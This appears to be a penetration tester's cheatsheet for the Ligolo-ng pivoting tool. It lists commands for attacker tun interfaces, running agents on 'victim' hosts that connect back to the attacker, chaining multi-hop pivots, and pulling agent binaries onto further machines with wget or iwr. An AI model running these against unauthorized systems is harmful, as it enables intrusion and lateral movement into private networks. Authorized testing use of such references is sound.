# Ligolo-ng Cheatsheet

> Reference: https://github.com/nicocha30/ligolo-ng  
> Use port **11601** where possible — required for loopback routes.

---

## Placeholders

|Symbol|Meaning|
|---|---|
|`<LHOST>`|Your attacker IP|
|`<subnet>`|Internal subnet discovered via `ifconfig` in ligolo console|
|`<no.>`|Interface number (1, 2, 3...) for multi-pivot setups|

---

## Quick Start (Single Pivot)

```bash
# ── ATTACKER: create tun interface ───────────────────────────────────────────
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# ── ATTACKER: start proxy ────────────────────────────────────────────────────
./proxy -laddr 0.0.0.0:11601 -selfcert

# ── VICTIM: connect agent ────────────────────────────────────────────────────
.\agent.exe -connect <LHOST>:11601 -ignore-cert      # Windows
./agent     -connect <LHOST>:11601 -ignore-cert      # Linux

# ── LIGOLO CONSOLE ───────────────────────────────────────────────────────────
session      # select host
ifconfig     # note the internal subnet

# ── ATTACKER: add route to internal subnet ───────────────────────────────────
sudo ip r add <subnet>/<cidr> dev ligolo
sudo ip r add 240.0.0.1/32 dev ligolo    # optional loopback (see Loopbacks)

# ── LIGOLO CONSOLE ───────────────────────────────────────────────────────────
start
```

> Once started, `ip a` shows the interface as UP and the internal subnet is fully reachable.  
> `iwr` (Invoke-WebRequest) works well for file transfers through the tunnel.

---

## File Transfer Through Tunnel

Useful when you can't drop another agent on the next box yet. Traffic hitting `agent1:8080` forwards back to your Kali on port 80.

```bash
# ── LIGOLO CONSOLE (current session) ─────────────────────────────────────────
listener_add --addr 0.0.0.0:8080 --to 127.0.0.1:80 --tcp
# Note: listener_add is scoped per session — same port can be reused across sessions

# ── KALI: host files ─────────────────────────────────────────────────────────
python3 -m http.server 80

# ── SEQUESTERED BOX: pull files via agent1's internal IP ─────────────────────
wget http://<agent1_internal_ip>:8080/agent.exe -O agent.exe   # Linux
iwr -uri http://<agent1_internal_ip>:8080/agent.exe -Outfile agent.exe  # PowerShell
```

---

## Adding More Pivots (Multi-Hop)

Reference: https://docs.ligolo.ng/sample/double/

```bash
# ── THE FLOW: ────────────────────────────────────────────────────────────────
ATTACKER ──────────── agent1 (sees Net A + Net B)
                      └───────────────────── agent2 (on Net B)
                      
# ── ATTACKER: new interface per additional subnet ────────────────────────────
# You already have ligolo for Net A. You need a new one for Net B.
sudo ip tuntap add user $(whoami) mode tun ligolo<no.>
sudo ip link set ligolo<no.> up
sudo ip r add <new_subnet>/<cidr> dev ligolo<no.>

# ── LIGOLO CONSOLE (session of agent that can reach the next box) ────────────
# Tell agent1 to relay incoming agent connections
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601

# ── NEXT VICTIM BOX: connect through the chain ───────────────────────────────
./agent -connect <agent1_internal_ip>:11601 -ignore-cert

# ── LIGOLO CONSOLE ───────────────────────────────────────────────────────────
# Start the tunnel on the new interface
session                       # select the new session
ifconfig                      # confirm subnet
start --tun ligolo<no.>
```

---

## Loopbacks

Each pivot can have its own loopback — lets you reach services bound to localhost on the remote box via `240.0.0.<no.>:<port>` from your attacker machine.

```bash
# ── ATTACKER: add one loopback route per pivot ───────────────────────────────
sudo ip r add 240.0.0.1/32 dev ligolo        # pivot 1
sudo ip r add 240.0.0.2/32 dev ligolo2       # pivot 2
# ... no limit

# ── RESULT ───────────────────────────────────────────────────────────────────
ip r
  240.0.0.1 dev ligolo    scope link   # loopback for pivot 1
  240.0.0.2 dev ligolo2   scope link   # loopback for pivot 2
```

---

## Route Management

```bash
# Show all routes
ip r

# Add a route
sudo ip r add <subnet>/<cidr> dev ligolo<no.>

# Delete a specific route
sudo ip r del <subnet>/<cidr> dev ligolo<no.>
```

---

## Teardown / Cleanup

```bash
sudo ip link set ligolo<no.> down
sudo ip tuntap del dev ligolo<no.> mode tun
sudo ip route del <subnet>/<cidr> dev ligolo<no.>   # if route wasn't auto-removed
```

---

## Troubleshooting

|Problem|Fix|
|---|---|
|Interface already exists|Run teardown, then recreate|
|Agent connects but no traffic|Confirm route is added and `start` was run in console|
|Can't reach loopback service|Ensure `240.0.0.<no.>/32` route exists on correct interface|
|Multi-hop agent won't connect|Confirm `listener_add` is set on the right session before connecting|

---

## Further Reading

- Double pivot walkthrough: https://docs.ligolo.ng/sample/double/
- Pivoting guide: https://medium.com/@Poiint/pivoting-with-ligolo-ng-0ca402abc3e9